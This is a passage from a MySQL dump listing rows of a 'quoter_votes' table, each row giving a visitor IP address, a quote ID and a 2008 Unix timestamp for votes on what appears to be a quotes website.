  (429,'77.88.30.246','',0,14,1228076449),
  (430,'77.88.30.246','',0,16,1228076460),
  (431,'77.88.30.246','',0,11,1228076471),
  (432,'77.88.30.246','',0,19,1228076477),
  (433,'66.249.72.112','',0,38,1228077692),
  (434,'66.249.66.100','',0,19,1228082208),
  (435,'66.249.66.100','',0,16,1228082225),
  (436,'66.249.66.100','',0,18,1228082227),
  (437,'81.25.41.81','',0,39,1228082934),
  (438,'80.243.71.189','',0,29,1228088321),
  (439,'80.243.71.189','',0,30,1228088330),
  (440,'80.243.71.189','',0,39,1228088498),
  (441,'67.202.43.229','',0,16,1228090308),
  (442,'66.249.66.100','',0,6,1228091534),
  (443,'66.249.66.100','',0,4,1228091592),
  (444,'66.249.66.100','',0,3,1228091615),
  (445,'66.249.66.100','',0,15,1228092092),
  (446,'66.249.66.100','',0,7,1228092452),
  (447,'66.249.66.100','',0,22,1228092493),
  (448,'66.249.66.100','',0,12,1228092501),
  (449,'66.249.66.100','',0,8,1228092548),
  (450,'66.249.66.100','',0,10,1228092680),
  (451,'66.249.66.100','',0,1,1228092958),
  (452,'66.249.66.100','',0,11,1228093174),
  (453,'67.202.43.229','',0,26,1228096073),
  (454,'67.202.43.229','',0,29,1228096095),
  (455,'67.202.43.229','',0,39,1228096122),
  (456,'67.202.43.229','',0,24,1228096157),
  (457,'67.202.43.229','',0,27,1228096162),
  (458,'67.202.43.229','',0,38,1228096172),
  (459,'67.202.43.229','',0,23,1228096819),
  (460,'67.202.43.229','',0,25,1228096842),
  (461,'67.202.43.229','',0,28,1228096862),
  (462,'67.202.43.229','',0,30,1228096882),
  (463,'66.249.66.100','',0,2,1228097003),
  (464,'66.249.66.100','',0,5,1228097012),
  (465,'66.249.66.100','',0,20,1228097132),
  (466,'66.249.66.100','',0,42,1228097136),
  (467,'66.249.66.100','',0,17,1228098464),
  (468,'66.249.66.100','',0,9,1228098468),
  (469,'66.249.66.100','',0,14,1228098487),
  (470,'66.249.66.100','',0,1,1228100680),
  (471,'78.24.226.3','',0,42,1228103256),
  (472,'87.119.235.169','',0,39,1228103776),
  (473,'80.243.71.189','',0,43,1228104025),
  (474,'80.243.71.189','',0,42,1228104034),
  (475,'93.88.5.98','',0,39,1228105730),
  (476,'93.88.5.98','',0,3,1228105763),
  (477,'217.175.19.253','',0,19,1228113140),
  (478,'80.243.71.189','',0,43,1228113268),
  (479,'80.243.71.189','',0,39,1228113290),
  (480,'85.234.62.83','',0,43,1228113948),
  (481,'85.234.62.83','',0,42,1228113973),
  (482,'85.234.62.83','',0,39,1228113981),
  (483,'78.24.226.3','',0,43,1228115293),
  (484,'91.198.170.249','',0,39,1228116120),
  (485,'91.198.170.249','',0,42,1228116126),
  (486,'91.198.170.249','',0,38,1228116130),
  (487,'91.198.170.249','',0,29,1228116133),
  (488,'217.168.76.85','',0,23,1228116188),
  (489,'81.3.153.120','',0,16,1228117155),
  (490,'81.3.153.120','',0,19,1228117158),
  (491,'78.24.224.149','',0,42,1228121991),
  (492,'78.24.224.149','',0,4,1228122043),
  (493,'78.24.224.149','',0,1,1228122049),
  (494,'91.193.212.2','',0,21,1228123065),
  (495,'193.151.90.70','',0,24,1228125434),
  (496,'193.151.90.70','',0,18,1228125453),
  (497,'193.151.90.70','',0,6,1228125520),
  (498,'193.151.90.70','',0,2,1228125551),
  (499,'193.151.90.70','',0,1,1228125570),
  (500,'93.120.205.4','',0,45,1228127829);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (501,'87.225.47.163','',0,45,1228127897),
  (502,'213.137.232.149','',0,43,1228128936),
  (503,'193.227.120.34','',0,45,1228129947),
  (504,'193.227.120.34','',0,27,1228130085),
  (505,'193.227.120.34','',0,28,1228130219),
  (506,'89.31.118.252','',0,21,1228134164),
  (507,'213.137.232.195','',0,16,1228139000),
  (508,'213.137.232.195','',0,21,1228139354),
  (509,'213.137.232.195','',0,30,1228139380),
  (510,'213.137.232.195','',0,12,1228139406),
  (511,'83.239.239.154','',0,6,1228143145),
  (512,'217.77.223.104','',0,21,1228144645),
  (513,'217.77.223.104','',0,30,1228144651),
  (514,'85.114.2.238','',0,24,1228146245),
  (515,'78.106.251.82','',0,46,1228157881),
  (516,'193.151.90.129','',0,17,1228159478),
  (517,'193.151.90.129','',0,10,1228159581),
  (518,'212.92.224.118','',0,39,1228159714),
  (519,'212.92.224.118','',0,20,1228159891),
  (520,'212.92.224.118','',0,29,1228159906),
  (521,'193.151.90.129','',0,6,1228160805),
  (522,'94.253.37.3','',0,29,1228161701),
  (523,'89.178.227.8','',0,46,1228162672),
  (524,'89.178.227.8','',0,29,1228162707),
  (525,'89.178.227.8','',0,18,1228162781),
  (526,'89.178.227.8','',0,47,1228163051),
  (527,'77.88.30.246','',0,42,1228167884),
  (528,'77.88.30.246','',0,39,1228167889),
  (529,'80.73.0.127','',0,45,1228168609),
  (530,'80.73.0.127','',0,42,1228168616),
  (531,'80.73.0.127','',0,39,1228168633),
  (532,'80.73.0.127','',0,25,1228168643),
  (533,'80.73.0.127','',0,26,1228168656),
  (534,'80.73.0.127','',0,29,1228168660),
  (535,'77.88.30.246','',0,14,1228171803),
  (536,'77.88.30.246','',0,3,1228171810),
  (537,'77.88.30.246','',0,30,1228171815),
  (538,'77.88.30.246','',0,22,1228171820),
  (539,'77.88.30.246','',0,26,1228171826),
  (540,'77.88.30.246','',0,27,1228171844),
  (541,'77.88.30.246','',0,28,1228171862),
  (542,'77.88.30.246','',0,38,1228171872),
  (543,'77.88.30.246','',0,25,1228171895),
  (544,'77.88.30.246','',0,24,1228171918),
  (545,'77.88.30.246','',0,23,1228171934),
  (546,'77.88.30.246','',0,29,1228171942),
  (547,'205.196.222.10','',0,45,1228172123),
  (548,'205.196.222.10','',0,44,1228172303),
  (549,'205.196.222.10','',0,43,1228172484),
  (550,'205.196.222.10','',0,42,1228172666),
  (551,'205.196.222.10','',0,39,1228172843),
  (552,'205.196.222.10','',0,38,1228173023),
  (553,'205.196.222.10','',0,30,1228173203),
  (554,'205.196.222.10','',0,29,1228173383),
  (555,'205.196.222.10','',0,28,1228173563),
  (556,'205.196.222.10','',0,27,1228173744),
  (557,'78.24.226.3','',0,45,1228177646),
  (558,'78.24.226.3','',0,47,1228177753),
  (559,'78.24.226.3','',0,46,1228177755),
  (560,'78.24.226.3','',0,44,1228180101),
  (561,'89.122.29.82','',0,29,1228180481),
  (562,'89.122.29.82','',0,30,1228180485),
  (563,'89.122.29.82','',0,38,1228180496),
  (564,'89.122.29.82','',0,39,1228180504),
  (565,'89.122.29.82','',0,42,1228180508),
  (566,'89.122.29.82','',0,43,1228180513),
  (567,'89.122.29.82','',0,44,1228180524),
  (568,'89.122.29.82','',0,45,1228180530),
  (569,'89.122.29.82','',0,46,1228180536),
  (570,'89.122.29.82','',0,47,1228180539),
  (571,'89.122.29.82','',0,1,1228180555),
  (572,'89.122.29.82','',0,2,1228180567),
  (573,'89.122.29.82','',0,3,1228180571),
  (574,'89.122.29.82','',0,4,1228180576),
  (575,'89.122.29.82','',0,6,1228180595),
  (576,'89.122.29.82','',0,7,1228180601),
  (577,'89.122.29.82','',0,8,1228180614),
  (578,'89.122.29.82','',0,9,1228180618),
  (579,'89.122.29.82','',0,10,1228180633),
  (580,'89.122.29.82','',0,11,1228180646),
  (581,'89.122.29.82','',0,12,1228180650),
  (582,'89.122.29.82','',0,13,1228180654),
  (583,'89.122.29.82','',0,14,1228180659),
  (584,'89.122.29.82','',0,15,1228180663),
  (585,'89.122.29.82','',0,17,1228180669),
  (586,'89.122.29.82','',0,18,1228180675),
  (587,'93.88.5.140','',0,47,1228190730),
  (588,'80.243.71.189','',0,45,1228191891),
  (589,'78.24.226.3','',0,45,1228194555),
  (590,'77.35.1.5','',0,47,1228199640),
  (591,'77.35.1.5','',0,46,1228199669),
  (592,'77.35.1.5','',0,38,1228199782),
  (593,'77.35.1.5','',0,30,1228199856),
  (594,'77.35.1.5','',0,18,1228200103),
  (595,'82.207.125.180','',0,21,1228204817),
  (596,'78.24.226.238','',0,48,1228206665),
  (597,'78.24.226.238','',0,45,1228206701),
  (598,'78.24.226.238','',0,29,1228206727),
  (599,'78.24.226.238','',0,18,1228206735),
  (600,'78.24.226.238','',0,11,1228206760),
  (601,'78.24.226.238','',0,4,1228206767),
  (602,'78.24.226.238','',0,1,1228206776),
  (603,'213.137.232.149','',0,44,1228211695),
  (604,'82.207.125.180','',0,19,1228212507),
  (605,'82.207.125.180','',0,16,1228212741),
  (606,'82.207.125.180','',0,49,1228213254),
  (607,'82.207.125.180','',0,48,1228213255),
  (608,'89.28.29.67','',0,24,1228214918),
  (609,'89.28.29.67','',0,4,1228215237),
  (610,'91.202.196.193','',0,49,1228217792),
  (611,'91.202.196.193','',0,48,1228217814),
  (612,'91.202.196.193','',0,47,1228217817),
  (613,'213.137.232.149','',0,39,1228217827),
  (614,'85.234.62.83','',0,49,1228219866),
  (615,'85.234.62.83','',0,46,1228220029),
  (616,'66.249.66.100','',0,42,1228223183),
  (617,'66.249.66.100','',0,44,1228223462),
  (618,'66.249.66.100','',0,43,1228223647),
  (619,'66.249.66.100','',0,46,1228223659),
  (620,'66.249.66.100','',0,39,1228223726),
  (621,'66.249.66.100','',0,30,1228223743),
  (622,'66.249.66.100','',0,47,1228223846),
  (623,'66.249.66.100','',0,38,1228224004),
  (624,'66.249.66.100','',0,29,1228224040),
  (625,'77.35.30.89','',0,48,1228228694),
  (626,'77.35.30.89','',0,39,1228228893),
  (627,'77.35.30.89','',0,30,1228228954),
  (628,'82.207.125.180','',0,49,1228237279),
  (629,'195.112.96.41','',0,48,1228241875),
  (630,'194.88.211.254','',0,50,1228244761),
  (631,'94.253.17.222','',0,44,1228246098),
  (632,'94.253.17.222','',0,43,1228246102),
  (633,'93.175.8.80','',0,19,1228252346),
  (634,'194.88.211.254','',0,50,1228254655),
  (635,'77.88.30.246','',0,20,1228264203),
  (636,'77.88.30.246','',0,43,1228264209),
  (637,'77.88.30.246','',0,6,1228264224),
  (638,'77.88.30.246','',0,7,1228264230),
  (639,'77.88.30.246','',0,19,1228264235),
  (640,'77.88.30.246','',0,8,1228264242),
  (641,'77.88.30.246','',0,9,1228264247),
  (642,'77.88.30.246','',0,17,1228264256),
  (643,'77.88.30.246','',0,16,1228264264),
  (644,'77.88.30.246','',0,21,1228264272),
  (645,'77.88.30.246','',0,15,1228264279),
  (646,'77.88.30.246','',0,47,1228264286),
  (647,'77.88.30.246','',0,2,1228264292),
  (648,'77.88.30.246','',0,1,1228264297),
  (649,'77.88.30.246','',0,42,1228264303),
  (650,'77.88.30.246','',0,5,1228264310),
  (651,'77.88.30.246','',0,4,1228264326),
  (652,'77.88.30.246','',0,12,1228264329),
  (653,'77.88.30.246','',0,44,1228264338),
  (654,'77.88.30.246','',0,13,1228264346),
  (655,'77.88.30.246','',0,46,1228264371),
  (656,'77.88.30.246','',0,18,1228264386),
  (657,'77.88.30.246','',0,11,1228264393),
  (658,'77.88.30.246','',0,10,1228264403),
  (659,'87.118.115.69','',0,39,1228269223),
  (660,'81.200.211.90','',0,48,1228288820),
  (661,'80.243.71.189','',0,50,1228290375),
  (662,'66.249.66.47','',0,49,1228292135),
  (663,'80.243.71.189','',0,12,1228292209),
  (664,'80.243.71.189','',0,13,1228292220),
  (665,'80.243.71.189','',0,1,1228292263),
  (666,'66.249.66.47','',0,48,1228292643),
  (667,'66.249.66.47','',0,50,1228292645),
  (668,'66.249.66.47','',0,30,1228293384),
  (669,'85.95.148.2','',0,48,1228293574),
  (670,'212.176.211.125','',0,23,1228294480),
  (671,'66.249.66.47','',0,29,1228295072),
  (672,'82.207.125.180','',0,48,1228295572),
  (673,'82.207.125.180','',0,19,1228295661),
  (674,'212.248.60.126','',0,48,1228296476),
  (675,'194.246.116.62','',0,42,1228296584),
  (676,'66.249.66.47','',0,25,1228296736),
  (677,'66.249.66.47','',0,39,1228296754),
  (678,'82.207.125.180','',0,29,1228297217),
  (679,'66.249.66.47','',0,28,1228297412),
  (680,'94.25.61.246','',0,47,1228297535),
  (681,'195.250.62.9','',0,21,1228298056),
  (682,'66.249.66.47','',0,27,1228298072),
  (683,'195.250.62.9','',0,17,1228298124),
  (684,'195.250.62.9','',0,10,1228298239),
  (685,'66.249.66.47','',0,24,1228298437),
  (686,'66.249.66.47','',0,23,1228298724),
  (687,'66.249.66.47','',0,26,1228298724),
  (688,'212.98.162.74','',0,16,1228298924),
  (689,'85.118.230.114','',0,21,1228298960),
  (690,'213.219.216.40','',0,50,1228299268),
  (691,'212.98.162.74','',0,24,1228299303),
  (692,'212.98.162.74','',0,18,1228299483),
  (693,'91.124.217.78','',0,44,1228299992),
  (694,'78.24.227.51','',0,48,1228300523),
  (695,'78.24.227.51','',0,4,1228300721),
  (696,'78.24.227.51','',0,1,1228300728),
  (697,'83.167.71.122','',0,43,1228300750),
  (698,'78.24.227.51','',0,39,1228300842),
  (699,'78.24.227.51','',0,14,1228300885),
  (700,'195.218.191.205','',0,50,1228301295),
  (701,'195.218.191.205','',0,43,1228301429),
  (702,'195.218.191.205','',0,16,1228301500),
  (703,'195.218.191.205','',0,19,1228301533),
  (704,'195.218.191.205','',0,30,1228301699),
  (705,'195.218.191.205','',0,21,1228301732),
  (706,'92.112.83.9','',0,12,1228301862),
  (707,'217.20.178.234','',0,19,1228301887),
  (708,'92.112.83.9','',0,48,1228301942),
  (709,'213.79.121.66','',0,19,1228302240),
  (710,'77.108.66.140','',0,48,1228303286),
  (711,'77.108.66.140','',0,49,1228303303),
  (712,'77.108.66.140','',0,24,1228303520),
  (713,'81.89.69.126','',0,19,1228304119),
  (714,'85.90.206.104','',0,48,1228304774),
  (715,'212.248.60.126','',0,29,1228305114),
  (716,'195.98.173.130','',0,46,1228305297),
  (717,'213.184.225.132','',0,43,1228305516),
  (718,'194.242.123.122','',0,30,1228306304),
  (719,'89.113.75.132','',0,18,1228306568),
  (720,'77.246.227.22','',0,10,1228306950),
  (721,'193.222.190.6','',0,12,1228307103),
  (722,'195.184.70.254','',0,16,1228307152),
  (723,'217.21.164.156','',0,3,1228307219),
  (724,'194.88.211.254','',0,50,1228307341),
  (725,'192.194.76.43','',0,29,1228307536),
  (726,'217.20.178.234','',0,21,1228307581),
  (727,'217.20.178.234','',0,29,1228307584),
  (728,'193.222.190.6','',0,29,1228307665),
  (729,'150.70.84.27','',0,29,1228307698),
  (730,'212.98.179.118','',0,1,1228307907),
  (731,'217.21.164.28','',0,21,1228307947),
  (732,'195.190.115.154','',0,43,1228308623),
  (733,'195.190.115.154','',0,19,1228308719),
  (734,'212.176.211.125','',0,23,1228309134),
  (735,'194.105.144.202','',0,29,1228309891),
  (736,'62.64.65.186','',0,48,1228310720),
  (737,'88.210.57.43','',0,12,1228311873),
  (738,'89.162.136.26','',0,21,1228312097),
  (739,'91.195.13.98','',0,20,1228312402),
  (740,'213.247.207.250','',0,4,1228312525),
  (741,'80.94.174.82','',0,46,1228312917),
  (742,'194.44.221.46','',0,11,1228313018),
  (743,'92.124.61.177','',0,29,1228313285),
  (744,'80.82.58.4','',0,48,1228313663),
  (745,'78.111.223.148','',0,21,1228314248),
  (746,'194.88.211.254','',0,50,1228314761),
  (747,'212.58.160.39','',0,42,1228315042),
  (748,'78.111.223.148','',0,23,1228315293),
  (749,'81.3.153.86','',0,29,1228315346),
  (750,'87.245.185.58','',0,27,1228315576),
  (751,'87.245.185.58','',0,24,1228315632),
  (752,'195.58.233.186','',0,43,1228315894),
  (753,'87.245.185.58','',0,16,1228315998),
  (754,'212.98.162.74','',0,1,1228316516),
  (755,'87.245.147.10','',0,19,1228317216),
  (756,'94.77.35.81','',0,50,1228317275),
  (757,'94.77.35.81','',0,49,1228317278),
  (758,'94.77.35.81','',0,48,1228317280),
  (759,'94.77.35.81','',0,47,1228317281),
  (760,'94.77.35.81','',0,46,1228317283),
  (761,'94.77.35.81','',0,44,1228317284),
  (762,'94.77.35.81','',0,43,1228317287),
  (763,'94.77.35.81','',0,42,1228317288),
  (764,'94.77.35.81','',0,39,1228317290),
  (765,'213.180.217.231','',0,43,1228317292),
  (766,'94.77.35.81','',0,38,1228317296),
  (767,'213.180.217.231','',0,39,1228317299),
  (768,'94.77.32.19','',0,50,1228317304),
  (769,'94.77.32.19','',0,49,1228317305),
  (770,'94.77.35.81','',0,30,1228317306),
  (771,'94.77.35.81','',0,29,1228317308),
  (772,'94.77.35.81','',0,28,1228317310),
  (773,'94.77.35.81','',0,27,1228317313),
  (774,'94.77.35.81','',0,26,1228317314),
  (775,'94.77.32.19','',0,47,1228317314),
  (776,'94.77.35.81','',0,25,1228317315),
  (777,'94.77.35.81','',0,24,1228317319),
  (778,'94.77.32.19','',0,46,1228317321),
  (779,'94.77.35.81','',0,23,1228317321),
  (780,'94.77.35.81','',0,22,1228317325),
  (781,'94.77.35.81','',0,21,1228317327),
  (782,'94.77.32.19','',0,44,1228317327),
  (783,'94.77.32.19','',0,43,1228317328),
  (784,'94.77.32.19','',0,42,1228317329),
  (785,'94.77.32.19','',0,39,1228317331),
  (786,'94.77.35.81','',0,16,1228317341),
  (787,'94.77.35.81','',0,5,1228317348),
  (788,'94.77.35.81','',0,15,1228317352),
  (789,'94.77.32.19','',0,38,1228317353),
  (790,'94.77.35.81','',0,12,1228317353),
  (791,'94.77.35.81','',0,14,1228317355),
  (792,'94.77.35.81','',0,13,1228317356),
  (793,'94.77.35.81','',0,11,1228317365),
  (794,'94.77.35.81','',0,10,1228317366),
  (795,'94.77.32.19','',0,30,1228317390),
  (796,'94.77.32.19','',0,1,1228317420),
  (797,'213.180.217.231','',0,28,1228317429),
  (798,'94.77.32.19','',0,2,1228317434),
  (799,'94.77.32.19','',0,3,1228317458),
  (800,'94.77.32.19','',0,6,1228317618),
  (801,'94.77.32.19','',0,4,1228317638),
  (802,'212.98.179.118','',0,18,1228318116),
  (803,'195.238.92.2','',0,43,1228318165),
  (804,'212.98.179.118','',0,42,1228318249),
  (805,'217.21.45.26','',0,20,1228318950),
  (806,'84.47.142.3','',0,21,1228319688),
  (807,'62.221.49.72','',0,19,1228319869),
  (808,'84.47.142.3','',0,23,1228319929),
  (809,'84.47.142.3','',0,48,1228320046),
  (810,'62.221.49.72','',0,29,1228320296),
  (811,'62.221.49.72','',0,18,1228320428),
  (812,'62.221.49.72','',0,21,1228320537),
  (813,'89.251.107.23','',0,5,1228321300),
  (814,'80.91.178.218','',0,19,1228322023),
  (815,'80.91.178.218','',0,16,1228322036),
  (816,'82.207.125.180','',0,48,1228322245),
  (817,'80.91.178.218','',0,49,1228322393),
  (818,'212.98.179.118','',0,43,1228322645),
  (819,'217.12.15.52','',0,19,1228323222),
  (820,'217.12.15.52','',0,28,1228323480),
  (821,'217.12.15.52','',0,43,1228323519),
  (822,'83.167.110.245','',0,21,1228324276),
  (823,'80.92.96.29','',0,50,1228325467),
  (824,'80.92.96.29','',0,42,1228325540),
  (825,'80.92.96.29','',0,39,1228325547),
  (826,'80.92.96.29','',0,26,1228325632),
  (827,'80.92.96.29','',0,18,1228325721),
  (828,'80.92.96.29','',0,17,1228325738),
  (829,'80.92.96.29','',0,20,1228325780),
  (830,'80.92.96.29','',0,5,1228325851),
  (831,'80.92.96.29','',0,13,1228326006),
  (832,'80.92.96.29','',0,11,1228326035),
  (833,'80.92.96.29','',0,10,1228326068),
  (834,'80.92.96.29','',0,9,1228326121),
  (835,'80.92.96.29','',0,8,1228326135),
  (836,'80.92.96.29','',0,7,1228326181),
  (837,'80.92.96.29','',0,6,1228326233),
  (838,'80.92.96.29','',0,2,1228326280),
  (839,'80.92.96.29','',0,1,1228326311),
  (840,'80.92.96.29','',0,15,1228326569),
  (841,'80.92.96.29','',0,28,1228327148),
  (842,'80.92.96.29','',0,16,1228327160),
  (843,'83.222.194.135','',0,43,1228328181),
  (844,'83.222.194.135','',0,19,1228328321),
  (845,'212.115.225.38','',0,42,1228328607),
  (846,'194.88.211.254','',0,50,1228330947),
  (847,'90.151.150.121','',0,43,1228334705),
  (848,'82.207.39.163','',0,2,1228338804),
  (849,'74.6.22.171','',0,43,1228340596),
  (850,'74.6.22.171','',0,47,1228340643),
  (851,'74.6.22.171','',0,42,1228340658),
  (852,'74.6.22.171','',0,44,1228340672),
  (853,'74.6.22.171','',0,38,1228340699),
  (854,'74.6.22.171','',0,50,1228340699),
  (855,'74.6.22.171','',0,49,1228340703),
  (856,'74.6.22.171','',0,46,1228342016),
  (857,'66.249.66.47','',0,42,1228343217),
  (858,'66.249.66.47','',0,47,1228343223),
  (859,'66.249.66.47','',0,48,1228343233),
  (860,'66.249.66.47','',0,43,1228343235),
  (861,'66.249.66.47','',0,38,1228343236),
  (862,'66.249.66.47','',0,50,1228343237),
  (863,'66.249.66.47','',0,49,1228343238),
  (864,'66.249.66.47','',0,44,1228343240),
  (865,'66.249.66.47','',0,46,1228343242),
  (866,'66.249.66.47','',0,39,1228343254),
  (867,'77.88.30.246','',0,46,1228344365),
  (868,'77.88.30.246','',0,48,1228344371),
  (869,'77.88.30.246','',0,43,1228344377),
  (870,'77.88.30.246','',0,49,1228344387),
  (871,'77.88.30.246','',0,47,1228344390),
  (872,'77.88.30.246','',0,50,1228344403),
  (873,'77.88.30.246','',0,44,1228344415),
  (874,'213.154.203.223','',0,39,1228344549),
  (875,'213.154.203.223','',0,12,1228344690),
  (876,'62.221.70.85','',0,1,1228346787),
  (877,'62.221.70.85','',0,29,1228346807),
  (878,'62.221.70.85','',0,21,1228346819),
  (879,'62.221.70.85','',0,18,1228346828),
  (880,'62.221.70.85','',0,39,1228346839),
  (881,'77.122.245.211','',0,21,1228346851),
  (882,'77.122.245.211','',0,18,1228346860),
  (883,'77.122.245.211','',0,48,1228346884),
  (884,'80.237.112.245','',0,50,1228350993),
  (885,'80.243.71.189','',0,29,1228352438),
  (886,'80.243.71.189','',0,20,1228352440),
  (887,'72.30.142.251','',0,39,1228355423),
  (888,'193.93.218.64','',0,1,1228356333),
  (889,'193.93.218.64','',0,50,1228358221),
  (890,'72.30.142.234','',0,39,1228362543),
  (891,'72.30.142.234','',0,48,1228363247),
  (892,'89.249.130.43','',0,27,1228364946),
  (893,'77.121.120.202','',0,2,1228368001),
  (894,'62.182.48.254','',0,17,1228368649),
  (895,'72.30.142.222','',0,48,1228368906),
  (896,'84.237.120.90','',0,39,1228370650),
  (897,'81.200.211.90','',0,28,1228371233),
  (898,'81.200.211.90','',0,19,1228371255),
  (899,'77.121.120.202','',0,51,1228374330),
  (900,'82.144.202.88','',0,24,1228378051),
  (901,'89.107.82.184','',0,48,1228378780),
  (902,'89.107.82.184','',0,11,1228378923),
  (903,'89.107.82.184','',0,4,1228378937),
  (904,'89.107.82.184','',0,1,1228378944),
  (905,'212.98.163.230','',0,51,1228379301),
  (906,'194.44.221.46','',0,51,1228381796),
  (907,'78.111.223.148','',0,51,1228383023),
  (908,'77.88.22.120','',0,50,1228384695),
  (909,'77.88.22.120','',0,43,1228384704),
  (910,'77.88.22.120','',0,48,1228384709),
  (911,'77.88.22.120','',0,52,1228384718),
  (912,'77.88.22.134','',0,50,1228386669),
  (913,'77.88.22.134','',0,43,1228386674),
  (914,'77.88.22.134','',0,48,1228386683),
  (915,'77.88.22.134','',0,52,1228386709),
  (916,'194.44.62.149','',0,22,1228387853),
  (917,'65.55.213.105','',0,48,1228390064),
  (918,'217.66.71.118','',0,6,1228390114),
  (919,'217.66.71.118','',0,54,1228390122),
  (920,'194.44.221.46','',0,51,1228390286),
  (921,'65.55.213.105','',0,50,1228390313),
  (922,'65.55.213.105','',0,38,1228390321),
  (923,'217.66.71.118','',0,27,1228390503),
  (924,'65.55.213.105','',0,39,1228390760),
  (925,'65.55.213.105','',0,43,1228390896),
  (926,'65.55.213.105','',0,47,1228390939),
  (927,'65.55.213.105','',0,46,1228390945),
  (928,'65.55.213.105','',0,44,1228390948),
  (929,'65.55.213.105','',0,49,1228390973),
  (930,'65.55.213.105','',0,42,1228391032),
  (931,'91.202.197.79','',0,54,1228391179),
  (932,'217.66.71.118','',0,12,1228391194),
  (933,'82.151.106.132','',0,54,1228391351),
  (934,'89.251.107.24','',0,28,1228391406),
  (935,'66.249.66.47','',0,23,1228391406),
  (936,'94.248.53.109','',0,29,1228391646),
  (937,'94.248.53.109','',0,18,1228391656),
  (938,'94.248.53.109','',0,1,1228391674),
  (939,'94.248.53.109','',0,21,1228391686),
  (940,'66.249.66.47','',0,12,1228392211),
  (941,'72.30.142.222','',0,50,1228392549),
  (942,'92.46.47.134','',0,55,1228392914),
  (943,'92.46.47.134','',0,52,1228392943),
  (944,'92.46.47.134','',0,51,1228392958),
  (945,'92.46.47.134','',0,50,1228392993),
  (946,'217.21.63.10','',0,51,1228393150),
  (947,'217.21.63.10','',0,48,1228393267),
  (948,'66.249.66.47','',0,24,1228393267),
  (949,'66.249.66.47','',0,13,1228393347),
  (950,'66.231.188.140','',0,50,1228394117),
  (951,'91.202.197.79','',0,55,1228394268),
  (952,'81.18.116.69','',0,55,1228395157),
  (953,'81.211.12.150','',0,29,1228395166),
  (954,'81.211.12.150','',0,54,1228395297),
  (955,'66.249.66.47','',0,51,1228395339),
  (956,'66.231.188.140','',0,53,1228395460),
  (957,'91.202.197.79','',0,56,1228396641),
  (958,'193.93.218.64','',0,56,1228396698),
  (959,'66.249.66.47','',0,52,1228396760),
  (960,'193.93.218.64','',0,54,1228396761),
  (961,'66.231.188.140','',0,48,1228396844),
  (962,'66.231.188.140','',0,55,1228396933),
  (963,'66.231.188.140','',0,54,1228397211),
  (964,'81.3.153.120','',0,56,1228397761),
  (965,'66.231.188.140','',0,47,1228398689),
  (966,'85.21.184.194','',0,54,1228399008),
  (967,'77.88.41.70','',0,55,1228399194),
  (968,'77.88.41.70','',0,49,1228399215),
  (969,'77.88.41.70','',0,52,1228399245),
  (970,'194.88.211.254','',0,56,1228399662),
  (971,'194.88.211.254','',0,50,1228399688),
  (972,'209.160.64.220','',0,54,1228399762),
  (973,'92.47.215.38','',0,55,1228399863),
  (974,'92.47.215.38','',0,58,1228399925),
  (975,'82.209.244.232','',0,58,1228399938),
  (976,'92.47.215.38','',0,57,1228399946),
  (977,'82.209.244.232','',0,44,1228400050),
  (978,'193.93.218.64','',0,59,1228400573),
  (979,'91.202.197.79','',0,60,1228401019),
  (980,'91.202.197.79','',0,59,1228401419),
  (981,'92.47.215.38','',0,60,1228401810),
  (982,'92.47.215.38','',0,59,1228401821),
  (983,'92.47.215.38','',0,52,1228402055),
  (984,'92.47.215.38','',0,51,1228402076),
  (985,'91.202.197.79','',0,58,1228402115),
  (986,'193.108.44.30','',0,50,1228402963),
  (987,'66.249.66.47','',0,53,1228402968),
  (988,'193.108.44.30','',0,48,1228403042),
  (989,'84.17.11.132','',0,23,1228403376),
  (990,'66.249.66.47','',0,54,1228405389),
  (991,'77.106.119.46','',0,42,1228405781),
  (992,'72.30.142.88','',0,21,1228406257),
  (993,'66.249.66.47','',0,55,1228406317),
  (994,'77.88.41.87','',0,59,1228408132),
  (995,'77.88.41.87','',0,53,1228408139),
  (996,'77.88.41.87','',0,57,1228408146),
  (997,'89.20.115.16','',0,3,1228409810),
  (998,'94.181.129.156','',0,6,1228415245),
  (999,'94.181.129.156','',0,8,1228415254),
  (1000,'94.181.129.156','',0,14,1228415298);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 1000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (1001,'94.181.129.156','',0,12,1228415303),
  (1002,'94.181.129.156','',0,18,1228415335),
  (1003,'94.181.129.156','',0,21,1228415417),
  (1004,'94.181.129.156','',0,27,1228415895),
  (1005,'94.181.129.156','',0,28,1228415989),
  (1006,'94.181.129.156','',0,29,1228416031),
  (1007,'94.181.129.156','',0,30,1228416075),
  (1008,'94.181.129.156','',0,38,1228416209),
  (1009,'94.181.129.156','',0,42,1228416281),
  (1010,'94.181.129.156','',0,43,1228416327),
  (1011,'94.181.129.156','',0,54,1228416770),
  (1012,'94.181.129.156','',0,56,1228416878),
  (1013,'94.181.129.156','',0,60,1228417000),
  (1014,'79.171.124.52','',0,48,1228421212),
  (1015,'74.6.18.230','',0,12,1228422946),
  (1016,'92.113.110.82','',0,57,1228423245),
  (1017,'92.113.110.82','',0,48,1228423260),
  (1018,'92.113.110.82','',0,30,1228423266),
  (1019,'92.113.110.82','',0,21,1228423282),
  (1020,'92.113.110.82','',0,29,1228423369),
  (1021,'92.113.110.82','',0,18,1228423392),
  (1022,'92.113.110.82','',0,1,1228423411),
  (1023,'92.113.110.82','',0,24,1228423437),
  (1024,'78.106.181.206','',0,1,1228424669),
  (1025,'78.106.181.206','',0,6,1228424681),
  (1026,'78.106.181.206','',0,20,1228424752),
  (1027,'78.106.181.206','',0,18,1228424805),
  (1028,'78.106.181.206','',0,21,1228424944),
  (1029,'78.106.181.206','',0,23,1228425141),
  (1030,'78.106.181.206','',0,24,1228425163),
  (1031,'78.106.181.206','',0,29,1228425355),
  (1032,'78.106.181.206','',0,38,1228425482),
  (1033,'78.106.181.206','',0,39,1228425487),
  (1034,'78.106.181.206','',0,42,1228425515),
  (1035,'78.106.181.206','',0,48,1228425742),
  (1036,'78.106.181.206','',0,54,1228425897),
  (1037,'78.106.181.206','',0,55,1228425905),
  (1038,'78.106.181.206','',0,56,1228425923),
  (1039,'78.106.181.206','',0,60,1228426012),
  (1040,'82.207.125.180','',0,57,1228426160),
  (1041,'92.255.211.127','',0,10,1228426347),
  (1042,'92.255.211.127','',0,11,1228426385),
  (1043,'92.255.211.127','',0,9,1228426418),
